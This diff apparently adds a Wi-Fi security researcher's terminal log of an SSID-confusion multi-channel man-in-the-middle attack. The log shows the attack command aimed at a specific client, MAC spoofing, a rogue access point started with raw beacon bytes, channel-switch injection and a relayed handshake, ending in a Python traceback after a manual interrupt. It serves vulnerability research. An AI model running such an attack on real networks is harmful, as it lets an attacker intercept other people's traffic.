@@ -1,0 +1,127 @@
+[mc-mitm-ssid]# ./mc-mitm.py wlan1 wlan2 TelenetWiFree --target 60:03:08:8e:a2:50
+[04:56:34] Note: disable Wi-Fi in your network manager so it doesn't interfere with this script
+[04:56:34] Note: keep >1 meter between interfaces. Else packet delivery is unreliable
+[04:56:35] Monitor mode: using wlan1 on real channel and wlan2 on rogue channel.
+[04:56:35] Searching for target network TelenetWiFree
+[04:56:35] Target network c4:e9:84:db:fb:7b detected on channel 1
+[04:56:35] Will use wlan2a0 to create rogue AP on channel 11
+[04:56:35] Setting MAC address of wlan1 to 60:03:08:8e:a2:50
+[04:56:35] Setting MAC address of wlan2a0 to c4:e9:84:db:fb:7b
+[04:56:35] Starting AP using: iw dev wlan2a0 ap start kuleuven 2462 100 1 head 80000000ffffffffffffc4e984dbfb7bc4e984dbfb7b0000cbb0a837c01706006400110400086b756c657576656e010882848b960c12182403010b tail 2a010432043048606c30140100000fac040100000fac040100000fac010c003b0251007f080400000000000040dd180050f2020101010003a4000027a4000042435e0062322f00
+[04:56:35] Giving the rogue AP one second to initialize ...
+[04:56:36] Injected 4 CSA beacon pairs (moving stations to channel 11)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: Auth(seq=494, status=0)
+           Established MitM position against client 60:03:08:8e:a2:50
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: AssoReq(seq=495)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,Identity(seq=0)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,Identity(seq=0)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=1)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=1)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=2)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=2)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=3)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=3)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=4)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=4)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=5)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=5)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=6)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=6)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=7)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=7)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-Request,25(seq=8)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAP-2,25(seq=8)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAP-3,None(seq=9)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAPOL-Msg1(seq=10, replay=1)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAPOL-Msg2(seq=9, replay=1)
+[04:56:52] Real channel : c4:e9:84:db:fb:7b -> 60:03:08:8e:a2:50: EAPOL-Msg3(seq=11, replay=2)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EAPOL-Msg4(seq=10, replay=2)
+[04:56:52] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EncData(PN=1, len=126)
+[04:56:53] Rogue channel: 60:03:08:8e:a2:50 -> c4:e9:84:db:fb:7b: EncData(PN=2, len=126)
+^CTraceback (most recent call last):
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/./mc-mitm.py", line 791, in <module>
+    attack.run()
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/./mc-mitm.py", line 742, in run
+    if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
+                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/./mc-mitm.py", line 527, in handle_rx_roguechan
+    p = self.sock_rogue.recv()
+        ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/libwifi/wifi.py", line 419, in recv
+    p = L2Socket.recv(self, x)
+        ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/supersocket.py", line 182, in recv
+    pkt = cls(val)  # type: Packet
+          ^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 165, in __init__
+    self.dissect(_pkt)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1034, in dissect
+    self.do_dissect_payload(payl)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 1009, in do_dissect_payload
+    p = cls(s, _internal=1, _underlayer=self)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/base_classes.py", line 399, in __call__
+    i.__init__(*args, **kargs)
+  File "/home/mathy/research/wifi/wifi-ssid-confusion/ssid-confusion-hostap/mc-mitm-ssid/venv/lib/python3.12/site-packages/scapy/packet.py", line 176, in __init__
+    continue
+KeyboardInterrupt
+[04:57:20] Cleaning up ...
+
+[mc-mitm-ssid]# 
+
